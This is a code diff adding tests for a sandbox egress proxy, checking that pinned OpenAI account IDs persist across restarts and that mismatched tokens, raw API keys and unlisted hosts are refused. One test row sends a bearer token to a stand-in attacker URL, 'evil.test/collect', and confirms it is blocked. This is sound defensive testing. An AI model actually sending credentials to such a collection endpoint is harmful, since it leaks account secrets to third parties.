@@ -237,3 +237,57 @@ test("the egress entrypoint enforces the model services it was started with", as
     else { assert.equal(response.status, 403); assert.deepEqual(await response.json(), { error: "destination_not_allowed" }); assert.deepEqual(forwarded, []); }
   }
 });
+
+const token = account => `Bearer e30.${Buffer.from(JSON.stringify({ "https://api.openai.com/auth": { chatgpt_account_id: account } })).toString("base64url")}.c2ln`;
+
+test("model accounts are stored with the environment, reach the egress entrypoint at its next start and can be removed", async () => {
+  const f = fixture({ status: "paused" });
+  f.records.set("backup", { version: 2, createdAt: Date.now() });
+  assert.equal((await f.request({ timeoutSeconds: 600, modelAccounts: { openai: ["account-1"] } }, control, "resume")).status, 200);
+  assert.deepEqual(f.egress, [{ props: { modelServices: ["openai"], modelAccounts: { openai: ["account-1"] } } }]);
+  assert.deepEqual(f.records.get("record").modelAccounts, { openai: ["account-1"] });
+  assert.deepEqual((await (await f.sandbox.fetch(new Request("https://internal/security"))).json()).modelAccounts, { openai: ["account-1"] });
+  // A resume without the field keeps it; one for a running environment stores the change for the next start.
+  assert.equal((await f.request({}, control, "pause")).status, 200);
+  assert.equal((await f.request({ timeoutSeconds: 600 }, control, "resume")).status, 200);
+  assert.deepEqual(f.egress[1], { props: { modelServices: ["openai"], modelAccounts: { openai: ["account-1"] } } });
+  assert.equal((await f.request({ modelAccounts: { openai: ["account-2"] } }, control, "resume")).status, 200);
+  assert.equal(f.egress.length, 2);
+  assert.deepEqual(f.records.get("record").modelAccounts, { openai: ["account-2"] });
+  assert.equal((await f.request({}, control, "pause")).status, 200);
+  assert.equal((await f.request({ modelAccounts: {} }, control, "resume")).status, 200);
+  assert.deepEqual(f.egress[2], { props: { modelServices: ["openai"] } });
+  assert.equal("modelAccounts" in f.records.get("record"), false);
+  assert.equal((await (await f.sandbox.fetch(new Request("https://internal/security"))).json()).modelAccounts, null);
+  const created = fixture(); created.records.delete("record");
+  assert.equal((await created.sandbox.fetch(new Request("https://internal/create", { method: "POST", body: JSON.stringify({ id, template: "node24", modelAccounts: { openai: ["account-1"] } }) }))).status, 200);
+  assert.deepEqual(created.egress, [{ props: { modelServices: ["openai"], modelAccounts: { openai: ["account-1"] } } }]);
+  for (const modelAccounts of [null, ["account-1"], { openai: [] }, { anthropic: ["account-1"] }]) {
+    const invalid = fixture({ status: "paused" });
+    const response = await invalid.request({ timeoutSeconds: 600, modelAccounts }, control, "resume");
+    assert.equal(response.status, 400); assert.equal((await response.json()).error, "invalid_model_accounts");
+    assert.equal(invalid.starts.length, 0); assert.deepEqual(invalid.records.get("record"), invalid.record);
+  }
+});
+
+test("the egress entrypoint refuses another account's token and the API host before anything is sent upstream", async t => {
+  const forwarded = [];
+  t.mock.method(globalThis, "fetch", async request => { forwarded.push(request.url); return new Response("upstream"); });
+  const call = (props, url, headers = {}) => Object.assign(new AgentEgress(), { ctx: { props } }).fetch(new Request(url, { method: "POST", headers, body: "owner data" }));
+  const pinned = { modelAccounts: { openai: ["account-1"] } }, codex = "https://chatgpt.com/backend-api/codex/responses", api = "https://api.openai.com/v1/responses";
+  for (const [props, url, headers, error] of [
+    [pinned, codex, { Authorization: token("account-1") }, undefined],
+    [pinned, codex, { Authorization: token("account-2") }, "model_account_not_allowed"],
+    [pinned, codex, {}, "model_account_required"],
+    [pinned, codex, { Authorization: "Bearer sk-fixture-key" }, "model_account_required"],
+    [pinned, api, { Authorization: "Bearer sk-fixture-key" }, "model_api_key_not_allowed"],
+    [pinned, "https://auth.openai.com/oauth/token", {}, undefined],
+    [pinned, "https://evil.test/collect", { Authorization: token("account-1") }, "destination_not_allowed"],
+    [{}, codex, { Authorization: token("account-2") }, undefined], [{}, api, { Authorization: "Bearer sk-fixture-key" }, undefined],
+  ]) {
+    forwarded.length = 0;
+    const response = await call(props, url, headers);
+    if (error) { assert.equal(response.status, 403); assert.deepEqual(await response.json(), { error }); assert.deepEqual(forwarded, []); }
+    else { assert.equal(await response.text(), "upstream"); assert.deepEqual(forwarded, [url]); }
+  }
+});
